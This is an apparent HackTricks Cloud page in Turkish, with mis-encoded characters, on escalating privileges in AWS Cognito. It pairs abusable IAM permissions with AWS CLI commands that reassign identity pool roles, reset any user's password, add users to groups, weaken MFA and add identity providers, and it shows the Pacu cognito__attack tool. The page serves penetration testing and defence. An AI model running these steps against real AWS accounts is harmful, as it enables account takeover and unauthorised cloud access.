# AWS - Cognito AyrÄ±calÄ±k YÃ¼kseltme

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}

## Cognito

Cognito hakkÄ±nda daha fazla bilgi iÃ§in ÅŸuraya bakÄ±n:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Kimlik Havuzundan Kimlik Bilgileri Toplama

Cognito, hem **kimlik doÄŸrulanmÄ±ÅŸ** hem de **kimlik doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±lara** **IAM rol kimlik bilgileri** verebilir. Bir uygulamanÄ±n **Kimlik Havuz KimliÄŸi**'ni (uygulamada sabitlenmiÅŸ olmalÄ±dÄ±r) bulursanÄ±z, yeni kimlik bilgileri elde edebilir ve dolayÄ±sÄ±yla ayrÄ±calÄ±k yÃ¼kseltme yapabilirsiniz (muhtemelen Ã¶nceden hiÃ§bir kimlik bilgisine sahip olmadÄ±ÄŸÄ±nÄ±z bir AWS hesabÄ±nda).

Daha fazla bilgi iÃ§in [**bu sayfaya**](../aws-unauthenticated-enum-access/#cognito) bakÄ±n.

**Potansiyel Etki:** Kimlik doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±lara baÄŸlÄ± hizmetler rolÃ¼ne doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme (ve muhtemelen kimlik doÄŸrulanmÄ±ÅŸ kullanÄ±cÄ±lara baÄŸlÄ± olanÄ±). 

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Bu izinle, kimlik doÄŸrulanmÄ±ÅŸ/doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±lara **herhangi bir cognito rolÃ¼** verebilirsiniz.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
EÄŸer cognito uygulamasÄ±nda **kimlik doÄŸrulamasÄ±z kullanÄ±cÄ±lar etkin deÄŸilse**, bunu etkinleÅŸtirmek iÃ§in `cognito-identity:UpdateIdentityPool` iznine de ihtiyacÄ±nÄ±z olabilir.

**Potansiyel Etki:** Herhangi bir cognito rolÃ¼ne doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-identity:update-identity-pool`

Bu izne sahip bir saldÄ±rgan, Ã¶rneÄŸin kendi kontrolÃ¼ altÄ±ndaki bir Cognito KullanÄ±cÄ± Havuzu veya giriÅŸ yapabileceÄŸi baÅŸka herhangi bir kimlik saÄŸlayÄ±cÄ±yÄ± ayarlayabilir ve ardÄ±ndan sadece **bu Cognito Kimlik Havuzuna eriÅŸmek iÃ§in bir yol olarak** giriÅŸ yapabilir. Daha sonra, o kullanÄ±cÄ± saÄŸlayÄ±cÄ±ya **giriÅŸ yapmak**, ona yapÄ±landÄ±rÄ±lmÄ±ÅŸ kimlik havuzundaki doÄŸrulanmÄ±ÅŸ rolÃ¼ne **eriÅŸim izni verecektir**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Bu izni kÃ¶tÃ¼ye kullanarak temel kimlik doÄŸrulamayÄ± **etkinleÅŸtirmek de mÃ¼mkÃ¼ndÃ¼r**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potansiyel Etki**: Kimlik havuzundaki yapÄ±landÄ±rÄ±lmÄ±ÅŸ kimlik doÄŸrulama IAM rolÃ¼nÃ¼ tehlikeye atabilir.

### `cognito-idp:AdminAddUserToGroup`

Bu izin, bir Cognito kullanÄ±cÄ±sÄ±nÄ± bir Cognito grubuna eklemeyi saÄŸlar, bu nedenle bir saldÄ±rgan bu izni kullanarak kontrolÃ¼ altÄ±ndaki bir kullanÄ±cÄ±yÄ± daha iyi ayrÄ±calÄ±klara veya farklÄ± IAM rollerine sahip diÄŸer gruplara ekleyebilir:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potansiyel Etki:** DiÄŸer Cognito gruplarÄ±na ve KullanÄ±cÄ± Havuzu GruplarÄ±na baÄŸlÄ± IAM rollerine ayrÄ±calÄ±k yÃ¼kseltme.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Bu izinlere sahip bir saldÄ±rgan, **kompromize edilmiÅŸ bir Cognito Kimlik SaÄŸlayÄ±cÄ±sÄ± tarafÄ±ndan kullanÄ±labilecek her IAM rolÃ¼ ile gruplar oluÅŸturabilir/gÃ¼ncelleyebilir** ve kompromize edilmiÅŸ bir kullanÄ±cÄ±yÄ± gruba dahil ederek tÃ¼m bu rolleri eriÅŸebilir:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potansiyel Etki:** DiÄŸer Cognito IAM rollerine ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-idp:AdminConfirmSignUp`

Bu izin, **bir kaydÄ± doÄŸrulamaya** olanak tanÄ±r. VarsayÄ±lan olarak, herkes Cognito uygulamalarÄ±na kaydolabilir, eÄŸer bu izin bÄ±rakÄ±lÄ±rsa, bir kullanÄ±cÄ± herhangi bir veri ile bir hesap oluÅŸturabilir ve bunu bu izinle doÄŸrulayabilir.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potansiyel Etki:** Yeni bir kullanÄ±cÄ± kaydÄ± yapabilirseniz, kimlik havuzu IAM rolÃ¼nde kimliÄŸi doÄŸrulanmÄ±ÅŸ kullanÄ±cÄ±lara dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltmesi yapabilirsiniz. Herhangi bir hesabÄ± onaylayarak diÄŸer uygulama iÅŸlevlerine dolaylÄ± ayrÄ±calÄ±k yÃ¼kseltmesi yapabilirsiniz.

### `cognito-idp:AdminCreateUser`

Bu izin bir saldÄ±rganÄ±n kullanÄ±cÄ± havuzunun iÃ§inde yeni bir kullanÄ±cÄ± oluÅŸturmasÄ±na izin verir. Yeni kullanÄ±cÄ± etkin olarak oluÅŸturulur, ancak ÅŸifresini deÄŸiÅŸtirmesi gerekecektir.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potansiyel Etki:** Kimlik havuzu IAM rolÃ¼ne doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme yeteneÄŸi. Herhangi bir kullanÄ±cÄ± oluÅŸturabilme yeteneÄŸi ile diÄŸer uygulama iÅŸlevlerine dolaylÄ± ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-idp:AdminEnableUser`

Bu izinler, bir saldÄ±rganÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ bir kullanÄ±cÄ±nÄ±n kimlik bilgilerini bulduÄŸu ve tekrar etkinleÅŸtirmesi gerektiÄŸi Ã§ok nadir bir senaryoda yardÄ±mcÄ± olabilir.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potansiyel Etki:** Kimlik havuzu IAM rolÃ¼ne dolaylÄ± olarak ayrÄ±calÄ±k yÃ¼kseltme yetkisi verir ve saldÄ±rgan devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ bir kullanÄ±cÄ±nÄ±n kimlik bilgilerine sahipse kullanÄ±cÄ±nÄ±n izinlerine eriÅŸebilir.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Bu izin, [**ADMIN\_USER\_PASSWORD\_AUTH** yÃ¶ntemiyle giriÅŸ yapÄ±lmasÄ±na izin verir](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Daha fazla bilgi iÃ§in baÄŸlantÄ±ya bakÄ±n.

### `cognito-idp:AdminSetUserPassword`

Bu izin, bir saldÄ±rganÄ±n **herhangi bir kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirmesine** olanak tanÄ±r, bÃ¶ylece herhangi bir kullanÄ±cÄ±nÄ±n kimliÄŸini taklit edebilir (MFA etkin olmayan kullanÄ±cÄ±lar iÃ§in).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potansiyel Etki:** Potansiyel olarak herhangi bir kullanÄ±cÄ±ya doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme, bu nedenle her kullanÄ±cÄ±nÄ±n Ã¼ye olduÄŸu tÃ¼m gruplara eriÅŸim ve Kimlik Havuzu doÄŸrulanmÄ±ÅŸ IAM rolÃ¼ne eriÅŸim.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Bir saldÄ±rgan, bu izni kullanarak kendi kontrolÃ¼ altÄ±ndaki bir mobil telefonu bir kullanÄ±cÄ±nÄ±n **SMS MFA'sÄ±** olarak ayarlamak iÃ§in potansiyel olarak kÃ¶tÃ¼ye kullanabilir.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Ã–ncekiyle benzer ÅŸekilde, bu izin bir kullanÄ±cÄ±nÄ±n MFA tercihlerini ayarlamak iÃ§in kullanÄ±labilir ve MFA korumasÄ±nÄ± atlamak iÃ§in kullanÄ±labilir.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Ã–ncekiyle benzer ÅŸekilde, bu izin, bir kullanÄ±cÄ± havuzunun MFA tercihlerini ayarlamak iÃ§in kullanÄ±labilir ve MFA korumasÄ±nÄ± atlamak iÃ§in kullanÄ±labilir.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** KullanÄ±cÄ± havuzunu gÃ¼ncellemek ve MFA politikasÄ±nÄ± deÄŸiÅŸtirmek mÃ¼mkÃ¼ndÃ¼r. [Buradan cli'yi kontrol edin](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potansiyel Etki:** DolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltmesi, saldÄ±rganÄ±n kimlik bilgilerini bildiÄŸi herhangi bir kullanÄ±cÄ±ya potansiyel olarak izin verebilir, bu da MFA korumasÄ±nÄ± atlamasÄ±na olanak tanÄ±yabilir.

### `cognito-idp:AdminUpdateUserAttributes`

Bu izne sahip bir saldÄ±rgan, kontrolÃ¼ altÄ±ndaki bir kullanÄ±cÄ±nÄ±n e-posta veya telefon numarasÄ±nÄ± veya baÅŸka bir Ã¶zniteliÄŸini deÄŸiÅŸtirebilir ve altÄ±ndaki bir uygulamada daha fazla ayrÄ±calÄ±k elde etmeye Ã§alÄ±ÅŸabilir.\
Bu, bir e-posta veya telefon numarasÄ±nÄ± deÄŸiÅŸtirmeye ve doÄŸrulanmÄ±ÅŸ olarak ayarlamaya olanak tanÄ±r.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potansiyel Etki:** KullanÄ±cÄ± Ã¶zniteliklerine dayalÄ± ayrÄ±calÄ±klar veren Cognito KullanÄ±cÄ± Havuzu kullanarak temel uygulamada potansiyel dolaylÄ± ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Bu izne sahip bir saldÄ±rgan, zaten mevcut havuz istemcilerinden daha az kÄ±sÄ±tlanmÄ±ÅŸ **yeni bir KullanÄ±cÄ± Havuzu Ä°stemcisi oluÅŸturabilir**. Ã–rneÄŸin, yeni istemci her tÃ¼rlÃ¼ kimlik doÄŸrulama yÃ¶ntemine izin verebilir, herhangi bir gizliye sahip olmayabilir, belirteÃ§ iptalini devre dÄ±ÅŸÄ± bÄ±rakabilir, belirteÃ§lerin daha uzun sÃ¼re geÃ§erli olmasÄ±na izin verebilir...

AynÄ±sÄ±, yeni bir istemci oluÅŸturmak yerine, **mevcut bir istemcinin deÄŸiÅŸtirilmesi** durumunda da yapÄ±labilir.

[**Komut satÄ±rÄ±nda**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (veya [**gÃ¼ncelleme komutunda**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) tÃ¼m seÃ§enekleri gÃ¶rebilirsiniz, kontrol edin!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potansiyel Etki:** KullanÄ±cÄ± Havuzu tarafÄ±ndan kullanÄ±lan Kimlik Havuzu yetkilendirilmiÅŸ kullanÄ±cÄ±sÄ±na dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltmesi olasÄ±lÄ±ÄŸÄ±, gÃ¼venlik Ã¶nlemlerini gevÅŸeten yeni bir istemci oluÅŸturarak ve bir saldÄ±rganÄ±n oluÅŸturabildiÄŸi bir kullanÄ±cÄ± ile giriÅŸ yapmasÄ±na olanak tanÄ±yarak mÃ¼mkÃ¼n hale gelir.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Bir saldÄ±rgan, bu izni kullanarak yeni kullanÄ±cÄ±larÄ± yÃ¼kleyerek kullanÄ±cÄ±lar oluÅŸturabilir.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Potansiyel Etki:** DoÄŸrulanmÄ±ÅŸ kullanÄ±cÄ±lar iÃ§in kimlik havuzu IAM rolÃ¼ne doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme. Herhangi bir kullanÄ±cÄ± oluÅŸturabilme yeteneÄŸi ile diÄŸer uygulama iÅŸlevlerine dolaylÄ± ayrÄ±calÄ±k yÃ¼kseltme.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Bir saldÄ±rgan yeni bir kimlik saÄŸlayÄ±cÄ± oluÅŸturabilir ve ardÄ±ndan **bu saÄŸlayÄ±cÄ± aracÄ±lÄ±ÄŸÄ±yla giriÅŸ yapabilir**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potansiyel Etki:** Kimlik havuzu IAM rolÃ¼ne doÄŸrudan ayrÄ±calÄ±k yÃ¼kseltme. Herhangi bir kullanÄ±cÄ± oluÅŸturabilme yeteneÄŸi ile diÄŸer uygulama iÅŸlevlerine dolaylÄ± ayrÄ±calÄ±k yÃ¼kseltme.

### cognito-sync:\* Analizi

Bu, Cognito Kimlik HavuzlarÄ±nÄ±n rollerinde varsayÄ±lan olarak Ã§ok yaygÄ±n bir izindir. Ä°zinlerin her zaman kÃ¶tÃ¼ gÃ¶rÃ¼ndÃ¼ÄŸÃ¼ bir joker karakter iÃ§ermesi (Ã¶zellikle AWS'den geliyorsa), **verilen izinler saldÄ±rganÄ±n bakÄ±ÅŸ aÃ§Ä±sÄ±ndan Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir**.

Bu izin, Kimlik HavuzlarÄ±nÄ±n ve Kimlik HavuzlarÄ± iÃ§indeki Kimlik Kimliklerinin kullanÄ±cÄ± bilgilerini okuma izni verir (bu hassas bilgi deÄŸildir).\
Kimlik Kimliklerine [**Veri KÃ¼meleri**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) atanabilir, bu da oturumlarÄ±n bilgileridir (AWS bunu bir **kayÄ±tlÄ± oyun** gibi tanÄ±mlar). Bu, bazÄ± hassas bilgiler iÃ§erebilir (ancak olasÄ±lÄ±k oldukÃ§a dÃ¼ÅŸÃ¼ktÃ¼r). Bu bilgilere nasÄ±l eriÅŸileceÄŸini [**enumarasyon sayfasÄ±nda**](../aws-services/aws-cognito-enum/) bulabilirsiniz.

Bir saldÄ±rgan ayrÄ±ca bu izinleri kullanarak kendisini bu veri kÃ¼melerindeki deÄŸiÅŸiklikleri yayÄ±nlayan bir Cognito akÄ±ÅŸÄ±na **kaydettirebilir** veya **cognito etkinliklerinde tetikleyici olan bir lambda** kullanabilir. Bunu kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmedim ve burada hassas bilgi beklemem, ancak imkansÄ±z deÄŸil.

### Otomatik AraÃ§lar

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS sÄ±zma Ã§erÃ§evesi, artÄ±k hesaptaki tÃ¼m Cognito varlÄ±klarÄ±nÄ±n enumarasyonunu otomatikleÅŸtiren ve zayÄ±f yapÄ±landÄ±rmalarÄ± iÅŸaretleyen "cognito\_\_enum" ve "cognito\_\_attack" modÃ¼llerini iÃ§erir, eriÅŸim kontrolÃ¼ iÃ§in kullanÄ±lan zayÄ±f yapÄ±landÄ±rmalarÄ±, kullanÄ±cÄ± Ã¶zniteliklerini vb. ve ayrÄ±ca kullanÄ±cÄ± oluÅŸturmayÄ± (MFA desteÄŸi de dahil olmak Ã¼zere) ve deÄŸiÅŸtirilebilir Ã¶zel Ã¶zniteliklere dayalÄ± ayrÄ±calÄ±k yÃ¼kseltmeyi, kullanÄ±labilir kimlik havuzu kimlik bilgilerini, id belgelerindeki rolÃ¼ assumable rolleri otomatikleÅŸtirir.

ModÃ¼llerin iÅŸlevlerinin aÃ§Ä±klamasÄ± iÃ§in [blog yazÄ±sÄ±nÄ±n](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) 2. bÃ¶lÃ¼mÃ¼ne bakÄ±n. Kurulum talimatlarÄ± iÃ§in ana [Pacu](https://github.com/RhinoSecurityLabs/pacu) sayfasÄ±na bakÄ±n.

#### KullanÄ±m

Belirli bir kimlik havuzu ve kullanÄ±cÄ± havuzu istemcisine karÅŸÄ± kullanÄ±cÄ± oluÅŸturma ve tÃ¼m ayrÄ±calÄ±k yÃ¼kseltme vektÃ¶rlerini denemek iÃ§in Ã¶rnek cognito\_\_attack kullanÄ±mÄ±:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Ã–rnek cognito\_\_enum kullanÄ±mÄ±, mevcut AWS hesabÄ±nda gÃ¶rÃ¼lebilen tÃ¼m kullanÄ±cÄ± havuzlarÄ±, kullanÄ±cÄ± havuzu istemcileri, kimlik havuzlarÄ±, kullanÄ±cÄ±lar vb. toplamak iÃ§in:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner), Cognito Ã¼zerinde farklÄ± saldÄ±rÄ±larÄ± uygulayan, biri de ayrÄ±calÄ±k yÃ¼kseltme olan bir Python CLI aracÄ±dÄ±r.

#### Kurulum
```bash
$ pip install cognito-scanner
```
#### KullanÄ±m
```bash
$ cognito-scanner --help
```
Daha fazla bilgi iÃ§in [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Ã–ÄŸren ve AWS Hacking pratiÄŸi yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ã–ÄŸren ve GCP Hacking pratiÄŸi yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Destek HackTricks</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol et!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±l veya [**telegram grubuna**](https://t.me/peass) katÄ±l veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip et.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸmak iÃ§in PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulun.

</details>
{% endhint %}
